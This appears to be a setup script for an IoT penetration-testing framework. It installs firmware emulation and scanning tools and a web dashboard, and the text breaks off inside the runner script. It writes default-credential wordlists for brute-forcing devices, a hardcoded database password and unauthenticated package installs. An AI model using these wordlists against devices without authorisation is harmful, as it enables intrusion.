#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  IoTStrike_setup.sh — Universal IoT Security Framework                      ║
# ║  Emulate · Scan · CVE Intel · Session Mgr · Web Dashboard · Reports         ║
# ║  Tested: Kali Linux 2023–2026 (amd64)                                       ║
# ║                                                                              ║
# ║  Author:  Yechiel Said                                                       ║
# ║  GitHub:  https://github.com/CyberSentinel-sys                               ║
# ║  Email:   yechielstudy@gmail.com                                             ║
# ║  Issues:  https://github.com/CyberSentinel-sys/iotstrike/issues              ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

set -euo pipefail
export DEBIAN_FRONTEND=noninteractive
export PYTHONDONTWRITEBYTECODE=1

# ── Colours ───────────────────────────────────────────────────────────────────
RED=$'\033[0;31m'; YEL=$'\033[0;33m'; GRN=$'\033[0;32m'
CYN=$'\033[0;36m'; BLD=$'\033[1m'; RST=$'\033[0m'
ok()   { echo -e "  ${GRN}[✔]${RST} $*"; }
info() { echo -e "  ${CYN}[*]${RST} $*"; }
warn() { echo -e "  ${YEL}[!]${RST} $*"; }
fail() { echo -e "  ${RED}[✗]${RST} $*"; }
step() { echo -e "\n${BLD}${CYN}══ $* ${RST}"; }
sep()  { echo -e "${CYN}────────────────────────────────────────────────────────${RST}"; }

[[ $EUID -ne 0 ]] && { fail "Must run as root: sudo bash $0"; exit 1; }

REAL_USER="${SUDO_USER:-$USER}"
BASE_DIR="/opt/iotstrike"
FIRM_DIR="$BASE_DIR/firmadyne"
VENV_DIR="$BASE_DIR/tools"
LOG_DIR="$BASE_DIR/logs"
DB_USER="firmadyne"; DB_NAME="firmware"; DB_PASS="firmadyne"
ERRORS=()
SETUP_LOG="/tmp/iotstrike_setup_$(date +%Y%m%d_%H%M%S).log"
exec > >(tee -a "$SETUP_LOG") 2>&1
chmod 600 "$SETUP_LOG" 2>/dev/null || true

# ── Banner ────────────────────────────────────────────────────────────────────
apt-get install -y -q figlet toilet 2>/dev/null || true
clear
echo -e "${BLD}${CYN}"
figlet -f slant "IoTStrike" 2>/dev/null || echo "  IoTStrike"
echo -e "${RST}"
echo -e "  ${BLD}Universal IoT Security Framework${RST}"
echo -e "  Emulate · Scan · CVE Intel · Sessions · Web UI · Reports"
sep; echo ""

# =============================================================================
# STEP 1 — System Update
# =============================================================================
step "System Update"

_draw_bar() {
    local pct=$1 label=$2 suffix="${3:-}" width=38
    local filled=$(( pct * width / 100 )); [[ $filled -gt $width ]] && filled=$width
    local bar="" empty=""
    for ((i=0;i<filled;i++)); do bar+="█"; done
    for ((i=filled;i<width;i++)); do empty+="░"; done
    printf "\r    %-28s ${CYN}[${GRN}%s${RST}%s${CYN}]${RST} %3d%% %s" \
        "$label" "$bar" "$empty" "$pct" "$suffix"
}

_suggest_fix() {
    local l="$1"
    [[ "$l" == *"NO_PUBKEY"* || "$l" == *"Missing key"* || "$l" == *"sqv"* ]] && \
        echo -e "      ${YEL}→ Auto-fixing GPG key...${RST}"
    [[ "$l" == *"404"* || "$l" == *"Failed to fetch"* ]] && \
        echo -e "      ${YEL}→ Rolling-repo cache stale — will auto-retry${RST}"
    [[ "$l" == *"lock"* ]] && \
        echo -e "      ${YEL}→ Fix: sudo rm /var/lib/dpkg/lock-frontend && sudo dpkg --configure -a${RST}"
}

_fix_gpg() {
    info "Repairing Kali archive signing keys..."
    wget -qO- https://archive.kali.org/archive-key.asc \
        | gpg --dearmor -o /usr/share/keyrings/kali-archive-keyring.gpg 2>/dev/null || true
    wget -qO- https://archive.kali.org/archive-key.asc | apt-key add - 2>/dev/null || true
    apt-get install -y --allow-unauthenticated kali-archive-keyring 2>/dev/null || true
    ok "GPG keys repaired"
}

APTL=$(mktemp /tmp/iotstrike_apt_XXXXXX.log)
ERRL=$(mktemp /tmp/iotstrike_err_XXXXXX.log)
echo ""

# 1/4 — update
_draw_bar 0 "[1/4] Package lists"
apt-get update -qq >"$APTL" 2>"$ERRL"; rc=$?
if grep -qE "NO_PUBKEY|Missing key|sqv returned" "$ERRL" 2>/dev/null; then
    echo ""; _fix_gpg; apt-get update -qq >"$APTL" 2>"$ERRL"; rc=$?
fi
if [[ $rc -ne 0 ]]; then
    printf "\r    %-28s ${RED}[FAILED]${RST}\n" "[1/4] Package lists"
    grep -E "^(E:|W:|Err)" "$ERRL" | while IFS= read -r l; do fail "$l"; _suggest_fix "$l"; done
    ERRORS+=("apt-get update failed")
else
    _draw_bar 100 "[1/4] Package lists" "${GRN}✔${RST}"; echo ""
fi

# 2/4 — upgrade
TOTAL=$(apt-get -s -q full-upgrade 2>/dev/null | grep -c "^Inst" 2>/dev/null | head -1 | tr -d "\n [:space:]" || echo 0)
TOTAL=$(( ${TOTAL:-0} + 0 ))  # force integer
if [[ "$TOTAL" -eq 0 ]]; then
    printf "    %-28s %s\n" "[2/4] Full upgrade" "${GRN}Already up to date ✔${RST}"
else
    apt-get full-upgrade -y -q \
        -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" \
        >"$APTL" 2>"$ERRL" &
    APT_PID=$!
    EXP=$(( TOTAL * 2 ))
    while kill -0 "$APT_PID" 2>/dev/null; do
        D=$(grep -cE "^(Unpacking|Setting up)" "$APTL" 2>/dev/null | tr -d "\n " || echo 0); D=$(( ${D:-0} + 0 ))
        P=$(( D * 95 / (EXP > 0 ? EXP : 1) )); [[ $P -gt 95 ]] && P=95
        _draw_bar "$P" "[2/4] Upgrading ($TOTAL pkgs)"; sleep 0.3
    done
    wait "$APT_PID" 2>/dev/null; URC=$?
    if [[ $URC -ne 0 ]]; then
        _draw_bar 0 "[2/4] Upgrading" "${RED}[FAILED]${RST}"; echo ""
        ERRORS+=("Full upgrade had errors")
    else
        _draw_bar 100 "[2/4] Upgrading ($TOTAL pkgs)" "${GRN}✔${RST}"; echo ""
    fi
fi

# 3/4 — fix broken
_draw_bar 0 "[3/4] Fix broken deps"
apt-get --fix-broken install -y -q \
    -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" \
    >"$APTL" 2>"$ERRL" && FRC=0 || FRC=$?
[[ $FRC -ne 0 ]] && { printf "\r    %-28s ${YEL}[warnings]${RST}\n" "[3/4] Fix broken deps"
    ERRORS+=("Some broken deps not resolved"); } \
    || { _draw_bar 100 "[3/4] Fix broken deps" "${GRN}✔${RST}"; echo ""; }

# 4/4 — cleanup
_draw_bar 0 "[4/4] Cleanup"
apt-get autoremove -y -q >/dev/null 2>&1 || true
apt-get autoclean -q >/dev/null 2>&1 || true
_draw_bar 100 "[4/4] Cleanup" "${GRN}✔${RST}"; echo ""
rm -f "$APTL" "$ERRL"; echo ""; ok "System update complete"

# =============================================================================
# STEP 2 — Install Packages
# =============================================================================
step "Installing Required Packages"

_apt_install() {
    local L; L=$(mktemp /tmp/apt_i_XXXXXX.log)
    set +e; apt-get install -y "$@" >"$L" 2>&1; local RC=$?; set -e
    if grep -q "404\|Failed to fetch\|Unable to fetch" "$L" 2>/dev/null; then
        warn "404 errors — refreshing cache and retrying..."
        apt-get clean; apt-get update -qq 2>/dev/null || true
        set +e; apt-get install -y --fix-missing "$@" >"$L" 2>&1; RC=$?; set -e
    fi
    [[ $RC -ne 0 ]] && { warn "Some packages had issues — attempting fix..."
        set +e; apt-get --fix-broken install -y -q \
            -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" >/dev/null 2>&1
        set -e; ERRORS+=("Package install issues for: $*"); }
    rm -f "$L"; return 0
}

info "Installing core + IoTStrike dependencies..."
_apt_install \
    busybox-static fakeroot git dmsetup kpartx netcat-openbsd \
    snmp util-linux vlan nmap python3-psycopg2 python3-pip \
    python3-magic python3-venv qemu-system-arm qemu-system-mips \
    qemu-system-x86 qemu-utils postgresql wget unzip expect \
    iproute2 figlet toilet nikto hydra curl jq \
    libbz2-dev liblzo2-dev libssl-dev zlib1g-dev build-essential
ok "Core packages installed"

info "Installing libfuse2..."
apt-get install -y libfuse2t64 2>/dev/null || apt-get install -y libfuse2 2>/dev/null \
    || { warn "libfuse2 unavailable"; ERRORS+=("libfuse2 not installed"); }

info "Installing uml-utilities (tunctl)..."
if apt-get install -y uml-utilities 2>/dev/null; then
    ok "uml-utilities from repos"
else
    TMP_DEB=$(mktemp /tmp/uml_XXXXXX.deb)
    warn "Fetching from Debian archive..."
    if wget -q --timeout=30 -O "$TMP_DEB" \
        "http://ftp.us.debian.org/debian/pool/main/u/uml-utilities/uml-utilities_20070815.4-2.1_amd64.deb" \
        && dpkg -i "$TMP_DEB" 2>/dev/null; then
        apt-get --fix-broken install -y 2>/dev/null || true; ok "uml-utilities installed"
    else
        warn "Installing tunctl shim..."
        cat > /usr/local/bin/tunctl << 'SHIM'
#!/bin/bash
IFACE="tap0"; UID_OWN=0
while [[ $# -gt 0 ]]; do
    case "$1" in -t) shift; IFACE="$1";; -u) shift; UID_OWN="$1";;
        -d) shift; ip link delete "$1" 2>/dev/null||true; exit 0;; esac; shift
done
ip tuntap add dev "$IFACE" mode tap 2>/dev/null||true
echo "Set '$IFACE' persistent and owned by uid $UID_OWN"
SHIM
        chmod +x /usr/local/bin/tunctl; ok "tunctl shim installed"
    fi
    rm -f "$TMP_DEB"
fi

info "MIPS cross-compilers (optional)..."
set +e
for p in gcc-mips-linux-gnu gcc-mipsel-linux-gnu g++-mipsel-linux-gnu; do
    apt-get install -y "$p" 2>/dev/null && echo "    [✔] $p" || true
done
set -e

info "Verifying critical packages..."
for pkg in qemu-system-mips qemu-system-arm qemu-utils git postgresql nmap; do
    if ! command -v "$pkg" &>/dev/null && ! dpkg -l "$pkg" 2>/dev/null | grep -q "^ii"; then
        warn "$pkg missing — individual retry..."
        set +e; apt-get install -y --fix-missing "$pkg" >/dev/null 2>&1; set -e
        command -v "$pkg" &>/dev/null || dpkg -l "$pkg" 2>/dev/null | grep -q "^ii" \
            && ok "$pkg installed" || { fail "$pkg MISSING"; ERRORS+=("CRITICAL: $pkg missing"); }
    fi
done
apt-get --fix-broken install -y -q \
    -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" >/dev/null 2>&1 || true
ok "Package verification complete"

# =============================================================================
# STEP 3 — Clone Firmadyne
# =============================================================================
step "Cloning Firmadyne"
info "Removing previous installation..."
rm -rf "$FIRM_DIR"
info "Cloning firmadyne/firmadyne..."
set +o pipefail
git clone --recursive https://github.com/firmadyne/firmadyne.git "$FIRM_DIR" 2>&1 \
    | grep -E "^(Cloning|remote:|Receiving|Resolving|error)" | head -6 || true
set -o pipefail
if [[ ! -d "$FIRM_DIR/scripts" ]]; then
    fail "git clone failed — $FIRM_DIR/scripts not found"; exit 1
fi
mkdir -p "$LOG_DIR"
[[ "$REAL_USER" != "root" ]] && chown -R "$REAL_USER:$REAL_USER" "$FIRM_DIR" 2>/dev/null || true
ok "Firmadyne cloned to $FIRM_DIR"

# =============================================================================
# STEP 4 — Binwalk
# =============================================================================
step "Installing Binwalk"
info "Cloning ReFirmLabs/binwalk..."
set +o pipefail
git clone https://github.com/ReFirmLabs/binwalk.git "$BASE_DIR/binwalk" 2>&1 \
    | grep -E "^(Cloning|remote:|Receiving)" | head -3 || true
set -o pipefail
info "Running dependencies installer..."
cd "$BASE_DIR/binwalk/dependencies"
set +e
bash ubuntu.sh >/tmp/binwalk_ubuntu.log 2>&1
BW_RC=$?
grep -E "(Error|error|installed|already)" /tmp/binwalk_ubuntu.log | grep -v "^$" | head -8 || true
set -e
cd "$BASE_DIR"
[[ $BW_RC -eq 0 ]] && ok "Binwalk dependencies installed" || warn "Binwalk ubuntu.sh had warnings (non-fatal)"

# =============================================================================
# STEP 5 — Python Virtual Environment
# =============================================================================
step "Python Virtual Environment"
info "Creating venv (system-site-packages)..."
set +e
set +o pipefail
python3 -m venv --system-site-packages "$VENV_DIR" 2>&1; VENV_RC=$?
if [[ $VENV_RC -ne 0 ]]; then
    warn "venv creation had issues — trying without --system-site-packages..."
    python3 -m venv "$VENV_DIR" 2>&1; VENV_RC=$?
fi
if [[ $VENV_RC -eq 0 ]]; then
    source "$VENV_DIR/bin/activate" 2>/dev/null || true
    pip install --upgrade pip --quiet 2>/dev/null || true
    pip install psycopg2-binary six requests --quiet 2>/tmp/pip_install.log || true
    grep -E "(Error|WARNING)" /tmp/pip_install.log | head -5 || true
    deactivate 2>/dev/null || true
    ok "Python venv at $VENV_DIR"
else
    warn "Python venv failed — setup may still work with system Python"
    ERRORS+=("Python venv creation failed")
fi
set -e
set -o pipefail

# =============================================================================
# STEP 6 — PostgreSQL
# =============================================================================
step "PostgreSQL Setup"
info "Starting PostgreSQL..."
service postgresql start 2>/dev/null || service postgresql restart 2>/dev/null || true
sleep 2
if ! pg_isready -q 2>/dev/null; then
    PG_VER=$(pg_lsclusters 2>/dev/null | awk 'NR==2{print $1}' || echo "")
    [[ -n "$PG_VER" ]] && pg_ctlcluster "$PG_VER" main start 2>/dev/null || true; sleep 2
fi
pg_isready -q 2>/dev/null && ok "PostgreSQL running" \
    || { fail "PostgreSQL failed to start"; ERRORS+=("CRITICAL: PostgreSQL not running"); }
sudo -u postgres psql -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;" 2>/dev/null || true
sudo -u postgres psql -c "ALTER DATABASE postgres  REFRESH COLLATION VERSION;" 2>/dev/null || true
sudo -u postgres psql -c "DROP DATABASE IF EXISTS $DB_NAME;" 2>/dev/null || true
sudo -u postgres psql -c "DROP USER     IF EXISTS $DB_USER;"  2>/dev/null || true
sudo -u postgres psql -c "CREATE USER $DB_USER WITH PASSWORD '$DB_PASS';"
sudo -u postgres createdb -O "$DB_USER" "$DB_NAME"
set +o pipefail
sudo -u postgres psql -d "$DB_NAME" < "$FIRM_DIR/database/schema" 2>&1 \
    | grep -vE "^(CREATE|ALTER|REVOKE|GRANT|DROP)" | grep "." | head -5 || true
set -o pipefail
ok "Database '$DB_NAME' ready"

# =============================================================================
# STEP 7 — Download QEMU Kernels
# =============================================================================
step "Downloading Firmware Support Binaries"
cd "$FIRM_DIR"
info "Downloading MIPS/ARM kernels and libnvram..."
set +o pipefail
bash download.sh 2>&1 | grep -E "saved|Error|failed" | head -20 || true
set -o pipefail
sed -i "s|^#\?FIRMWARE_DIR=.*|FIRMWARE_DIR=$FIRM_DIR|" "$FIRM_DIR/firmadyne.config"
grep -q "^FIRMWARE_DIR=" "$FIRM_DIR/firmadyne.config" \
    || echo "FIRMWARE_DIR=$FIRM_DIR" >> "$FIRM_DIR/firmadyne.config"
ok "Firmware binaries ready"

# =============================================================================
# STEP 8 — IoTStrike Directory Structure
# =============================================================================
step "Creating IoTStrike Structure"
mkdir -p "$BASE_DIR"/{sessions,reports,logs,web,wordlists}
info "Writing IoT credential wordlists..."
cat > "$BASE_DIR/wordlists/users.txt" << 'USERS'
admin
root
user
guest
support
service
administrator
ubnt
pi
cisco
manager
operator
USERS

cat > "$BASE_DIR/wordlists/passwords.txt" << 'PASSWORDS'

admin
password
1234
12345
123456
admin123
password123
root
guest
support
1111
0000
admin1234
toor
alpine
ubnt
raspberry
cisco
manager
letmein
welcome
PASSWORDS
ok "Wordlists written (${BLD}$(wc -l < "$BASE_DIR/wordlists/users.txt")${RST} users, ${BLD}$(wc -l < "$BASE_DIR/wordlists/passwords.txt")${RST} passwords)"

# =============================================================================
# STEP 9 — Web Dashboard
# =============================================================================
step "Web Dashboard"
info "Writing HTML dashboard..."
cat > "$BASE_DIR/web/index.html" << 'HTML'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>IoTStrike Dashboard</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:monospace;background:#0d0d0d;color:#e0e0e0;padding:20px}
h1{color:#00ff88;font-size:1.5em;margin-bottom:2px}
.sub{color:#555;font-size:.82em;margin-bottom:6px}
.ts{color:#333;font-size:.72em;margin-bottom:18px}
/* grid */
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px}
.full{grid-column:1/-1}
/* cards */
.card{background:#141414;border:1px solid #2a2a2a;border-radius:8px;padding:16px}
.card h2{font-size:.72em;color:#555;text-transform:uppercase;letter-spacing:.1em;margin-bottom:12px}
.val{font-size:1.05em;color:#fff;word-break:break-all}
/* tags */
.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:.73em;margin:2px}
.green{background:#0a2e1a;color:#00ff88;border:1px solid #00aa55}
.red  {background:#2e0a0a;color:#ff4444;border:1px solid #aa2222}
.amber{background:#2e1e0a;color:#ffbb33;border:1px solid #aa7722}
.blue {background:#0a1e2e;color:#44aaff;border:1px solid #2266aa}
.purple{background:#1a0a2e;color:#cc88ff;border:1px solid #6622aa}
/* status dot */
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px;vertical-align:middle}
.dot-up  {background:#00ff88;box-shadow:0 0 6px #00ff88}
.dot-down{background:#444}
/* CVE rows */
.cve-row{padding:5px 0;border-bottom:1px solid #1e1e1e;font-size:.82em}
.cvss-crit{color:#ff2222} .cvss-high{color:#ff6644}
.cvss-med {color:#ffbb33} .cvss-low {color:#44ff88}
/* log */
pre{color:#888;font-size:.72em;white-space:pre-wrap;max-height:180px;overflow-y:auto;
    background:#0a0a0a;border:1px solid #1e1e1e;border-radius:4px;padding:8px;margin-top:6px}
/* ── Command Center ── */
#cmd-card{border-color:#00ff8844}
#cmd-card h2{color:#00ff88}
.cmd-row{display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;margin-bottom:14px}
.cmd-row:last-child{margin-bottom:0}
.cmd-row label{font-size:.75em;color:#666;display:block;margin-bottom:4px}
.cmd-row input[type=text]{background:#0d0d0d;border:1px solid #333;border-radius:4px;
  color:#e0e0e0;font-family:monospace;font-size:.82em;padding:6px 10px;width:220px}
.cmd-row input[type=text]:focus{outline:none;border-color:#00ff8866}
.file-label{background:#0d0d0d;border:1px dashed #333;border-radius:4px;
  color:#666;font-size:.78em;padding:6px 12px;cursor:pointer;white-space:nowrap}
.file-label:hover{border-color:#00ff8866;color:#aaa}
input[type=file]{display:none}
/* buttons */
.btn{border:none;border-radius:4px;cursor:pointer;font-family:monospace;
  font-size:.78em;padding:7px 14px;transition:opacity .15s;white-space:nowrap}
.btn:disabled{opacity:.4;cursor:not-allowed}
.btn:hover:not(:disabled){opacity:.85}
.btn-green {background:#00aa55;color:#000}
.btn-blue  {background:#2266aa;color:#fff}
.btn-amber {background:#aa7722;color:#fff}
.btn-red   {background:#882222;color:#fff}
.btn-purple{background:#6622aa;color:#fff}
/* output panel */
#cmd-output{background:#090909;border:1px solid #1e1e1e;border-radius:4px;
  color:#00cc66;font-size:.72em;max-height:160px;min-height:40px;
  overflow-y:auto;padding:8px;white-space:pre-wrap;margin-top:12px}
.out-err{color:#ff4444} .out-ok{color:#00ff88} .out-info{color:#44aaff}
/* spinner */
@keyframes spin{to{transform:rotate(360deg)}}
.spinner{display:inline-block;width:10px;height:10px;border:2px solid #333;
  border-top-color:#00ff88;border-radius:50%;animation:spin .6s linear infinite;
  margin-right:6px;vertical-align:middle}
</style>
</head>
<body>

<h1>⚡ IoTStrike</h1>
<div class="sub">Universal IoT Security Framework — Interactive Command Center</div>
<div class="ts" id="ts">Connecting...</div>

<div class="grid">

  <!-- ══ COMMAND CENTER (full width, always first) ══ -->
  <div class="card full" id="cmd-card">
    <h2>⚡ Command Center</h2>

    <!-- Row 1: Upload & Emulate -->
    <div class="cmd-row">
      <div>
        <label>Firmware file</label>
        <label class="file-label" id="file-label" for="fw-file">
          📂 Choose file…
        </label>
        <input type="file" id="fw-file"
               accept=".zip,.bin,.tar,.gz,.img,.trx,.chk,.dlf,.w">
      </div>
      <div style="align-self:flex-end">
        <button class="btn btn-green" id="btn-emulate"
                onclick="doUpload()">🚀 Upload &amp; Emulate</button>
      </div>
    </div>

    <!-- Row 2: Scan / CVE / Report -->
    <div class="cmd-row">
      <div>
        <label>Target IP / hostname</label>
        <input type="text" id="scan-ip" placeholder="192.168.0.100">
      </div>
      <div style="align-self:flex-end">
        <button class="btn btn-blue" onclick="doScan()">🔍 Run Scan</button>
      </div>
      <div>
        <label>Vendor (for CVE lookup)</label>
        <input type="text" id="cve-vendor" placeholder="netgear">
      </div>
      <div style="align-self:flex-end">
        <button class="btn btn-amber" onclick="doCve()">🕵 Fetch CVE Intel</button>
      </div>
      <div style="align-self:flex-end">
        <button class="btn btn-red" onclick="doWipe()">🗑 Wipe Output</button>
      </div>
    </div>

    <!-- Output panel -->
    <div id="cmd-output">Ready. Select an action above.</div>
  </div>

  <!-- ══ STATUS CARDS ══ -->
  <div class="card">
    <h2>Target Status</h2>
    <div style="margin-bottom:8px">
      <span class="dot dot-down" id="status-dot"></span>
      <span id="target-status" style="color:#555">No active target</span>
    </div>
    <div class="val" id="target-ip" style="color:#333">—</div>
  </div>

  <div class="card">
    <h2>Firmware</h2>
    <div class="val" id="fw-vendor" style="color:#888">Unknown</div>
    <div style="margin-top:6px" id="fw-arch"></div>
  </div>

  <div class="card">
    <h2>Open Ports</h2>
    <div id="ports" style="color:#555">No scan yet</div>
  </div>

  <div class="card">
    <h2>CVE Findings</h2>
    <div id="cves" style="color:#555">No CVE data</div>
  </div>

  <div class="card full">
    <h2>Scan Log</h2>
    <pre id="scan-log">No scan data yet</pre>
  </div>

</div><!-- /grid -->

<script>
// ── Helpers ──────────────────────────────────────────────────────────────────
const out  = document.getElementById('cmd-output');
const log  = (msg, cls='') => {
  const line = document.createElement('div');
  if(cls) line.className = cls;
  line.textContent = new Date().toLocaleTimeString() + '  ' + msg;
  out.appendChild(line);
  out.scrollTop = out.scrollHeight;
};
const spin = (btn, on) => {
  if(on){
    btn._orig = btn.innerHTML;
    btn.innerHTML = '<span class="spinner"></span>Running…';
    btn.disabled = true;
  } else {
    btn.innerHTML = btn._orig;
    btn.disabled = false;
  }
};

// ── File picker label ────────────────────────────────────────────────────────
document.getElementById('fw-file').addEventListener('change', e => {
  const f = e.target.files[0];
  document.getElementById('file-label').textContent =
    f ? '📄 ' + f.name : '📂 Choose file…';
});

// ── Upload & Emulate ─────────────────────────────────────────────────────────
async function doUpload() {
  const fileInput = document.getElementById('fw-file');
  const btn = document.getElementById('btn-emulate');
  if (!fileInput.files.length) {
    log('⚠ No file selected.', 'out-err'); return;
  }
  const fd = new FormData();
  fd.append('firmware', fileInput.files[0]);
  spin(btn, true);
  log('⬆ Uploading ' + fileInput.files[0].name + ' …', 'out-info');
  try {
    const r = await fetch('/api/upload', { method: 'POST', body: fd });
    const d = await r.json();
    if (r.ok) {
      log('✔ Emulation started: ' + d.file, 'out-ok');
      log('  Log → ' + d.log, 'out-info');
    } else {
      log('✗ ' + (d.error || 'Upload failed'), 'out-err');
    }
  } catch(e) {
    log('✗ Network error: ' + e.message, 'out-err');
  } finally {
    spin(btn, false);
  }
}

// ── Run Scan ─────────────────────────────────────────────────────────────────
async function doScan() {
  // Prefer the typed IP; fall back to the current session target
  let ip = document.getElementById('scan-ip').value.trim()
         || document.getElementById('target-ip').textContent.trim();
  if (!ip || ip === '—') {
    log('⚠ Enter a target IP first.', 'out-err'); return;
  }
  const btn = event.currentTarget;
  spin(btn, true);
  log('🔍 Scan started → ' + ip, 'out-info');
  try {
    const r = await fetch('/api/command', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ action: 'scan', value: ip })
    });
    const d = await r.json();
    if (r.ok) {
      log('✔ Scan pipeline launched for ' + d.target, 'out-ok');
      log('  Log → ' + d.log, 'out-info');
    } else {
      log('✗ ' + (d.error || 'Scan failed'), 'out-err');
    }
  } catch(e) {
    log('✗ Network error: ' + e.message, 'out-err');
  } finally {
    spin(btn, false);
  }
}

// ── Fetch CVE Intel ───────────────────────────────────────────────────────────
async function doCve() {
  let vendor = document.getElementById('cve-vendor').value.trim()
             || document.getElementById('fw-vendor').textContent.trim();
  if (!vendor || vendor === 'Unknown') {
    log('⚠ Enter a vendor name first.', 'out-err'); return;
  }
  const btn = event.currentTarget;
  spin(btn, true);
  log('🕵 CVE lookup → ' + vendor, 'out-info');
  try {
    const r = await fetch('/api/command', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ action: 'cve', value: vendor })
    });
    const d = await r.json();
    if (r.ok) {
      log('✔ CVE lookup started for ' + d.target, 'out-ok');
      log('  Log → ' + d.log, 'out-info');
      setTimeout(refresh, 4000); // refresh CVE card after a moment
    } else {
      log('✗ ' + (d.error || 'CVE lookup failed'), 'out-err');
    }
  } catch(e) {
    log('✗ Network error: ' + e.message, 'out-err');
  } finally {
    spin(btn, false);
  }
}

// ── Wipe Output ───────────────────────────────────────────────────────────────
function doWipe() {
  out.innerHTML = '';
  log('Output cleared.', 'out-info');
}

// ── Auto-fill inputs from live session ───────────────────────────────────────
function autofillFromSession(d) {
  const ipEl = document.getElementById('scan-ip');
  const vEl  = document.getElementById('cve-vendor');
  if (!ipEl.value && d.target_ip && d.target_ip !== 'none')
    ipEl.value = d.target_ip;
  if (!vEl.value && d.vendor && d.vendor !== 'unknown')
    vEl.value = d.vendor;
}

// ── Status refresh (every 5s) ─────────────────────────────────────────────────
async function refresh() {
  try {
    const r = await fetch('/status.json?_=' + Date.now());
    if (!r.ok) return;
    const d = await r.json();
    document.getElementById('ts').textContent =
      'Last update: ' + new Date().toLocaleTimeString();

    const dot  = document.getElementById('status-dot');
    const stat = document.getElementById('target-status');
    if (d.target_ip && d.target_ip !== 'none') {
      dot.className  = 'dot dot-up';
      stat.textContent = 'LIVE';
      stat.style.color = '#00ff88';
    } else {
      dot.className  = 'dot dot-down';
      stat.textContent = 'No active target';
      stat.style.color = '#555';
    }
    document.getElementById('target-ip').textContent = d.target_ip || '—';
    document.getElementById('fw-vendor').textContent = d.vendor    || 'Unknown';

    const archEl = document.getElementById('fw-arch');
    archEl.innerHTML = d.arch
      ? '<span class="tag blue">' + d.arch + '</span>' : '';

    const portEl = document.getElementById('ports');
    if (d.ports && d.ports.length) {
      portEl.innerHTML = d.ports.map(p =>
        '<span class="tag ' +
        (p.includes('80') || p.includes('443') ? 'blue' :
         p.includes('22') ? 'green' : 'amber') +
        '">' + p + '</span>'
      ).join('');
    } else {
      portEl.textContent = 'No scan yet';
    }

    const cveEl = document.getElementById('cves');
    if (d.cves && d.cves.length) {
      cveEl.innerHTML = d.cves.slice(0, 6).map(c => {
        const s = parseFloat(c.score) || 0;
        const cls = s >= 9 ? 'cvss-crit' : s >= 7 ? 'cvss-high' :
                    s >= 4 ? 'cvss-med'  : 'cvss-low';
        return '<div class="cve-row"><span class="' + cls + '">CVSS:' +
               c.score + '</span>  ' + c.id + '</div>';
      }).join('');
    } else {
      cveEl.textContent = 'No CVE data';
    }

    if (d.scan_summary)
      document.getElementById('scan-log').textContent = d.scan_summary;

    autofillFromSession(d);
  } catch(e) {}
}

refresh();
setInterval(refresh, 5000);
</script>
</body>
</html>
HTML

# Initialise status.json
cat > "$BASE_DIR/web/status.json" << 'JSON'
{"target_ip":"none","vendor":"unknown","arch":"","ports":[],"cves":[],"scan_summary":"No scans yet","emulator":"none"}
JSON
ok "Web dashboard ready — serves at http://localhost:8080 when started"

# =============================================================================
# STEP 10 — Generate IoTStrike.sh Runner
# =============================================================================
step "Generating IoTStrike.sh Runner"
info "Writing runner..."

cat > "$BASE_DIR/IoTStrike.sh" << 'RUNNER_EOF'
#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║  IoTStrike.sh — Universal IoT Security Framework Runner                     ║
# ║  Usage: sudo bash /opt/iotstrike/IoTStrike.sh                               ║
# ║                                                                              ║
# ║  Author:  Yechiel Said                                                       ║
# ║  GitHub:  https://github.com/CyberSentinel-sys                               ║
# ║  Email:   yechielstudy@gmail.com                                             ║
# ║  Issues:  https://github.com/CyberSentinel-sys/iotstrike/issues              ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

set -u          # catch unbound variables; -e/-o pipefail removed — tools like
                # nmap/grep legitimately return non-zero and must not kill the menu
export PGPASSWORD="firmadyne"

[[ $EUID -ne 0 ]] && { echo "[✗] Must run as root: sudo bash $0"; exit 1; }

# ── Colours ───────────────────────────────────────────────────────────────────
R=$'\033[0;31m'; Y=$'\033[0;33m'; G=$'\033[0;32m'; C=$'\033[0;36m'
M=$'\033[0;35m'; B=$'\033[1m'; RST=$'\033[0m'
# Long-form aliases (used by _main_menu, _cleanup, and status bar)
RED="$R"; YEL="$Y"; GRN="$G"; CYN="$C"; MAG="$M"; BLD="$B"
ok()   { echo -e "  ${G}[✔]${RST} $*"; }
info() { echo -e "  ${C}[*]${RST} $*"; }
warn() { echo -e "  ${Y}[!]${RST} $*"; }
fail() { echo -e "  ${R}[✗]${RST} $*"; }
sep()  { echo -e "${C}──────────────────────────────────────────────────────────${RST}"; }

# ── Background job label registry ─────────────────────────────────────────────
# Parallel arrays: index N holds PID and human-readable label for the same job.
_JOB_PIDS=()
_JOB_NAMES=()

_track_job() {
    # Usage: _track_job <pid> "Human-readable label"
    _JOB_PIDS+=("$1")
    _JOB_NAMES+=("$2")
}

_show_jobs() {
    # Print live jobs with clean labels; prune finished ones from the arrays.
    local found=0 new_pids=() new_names=()
    for i in "${!_JOB_PIDS[@]}"; do
        if kill -0 "${_JOB_PIDS[$i]}" 2>/dev/null; then
            echo -e "    ${CYN}●${RST} ${_JOB_NAMES[$i]}  ${GRN}(PID ${_JOB_PIDS[$i]})${RST}"
            found=1
            new_pids+=("${_JOB_PIDS[$i]}")
            new_names+=("${_JOB_NAMES[$i]}")
        fi
    done
    _JOB_PIDS=("${new_pids[@]+"${new_pids[@]}"}")
    _JOB_NAMES=("${new_names[@]+"${new_names[@]}"}")
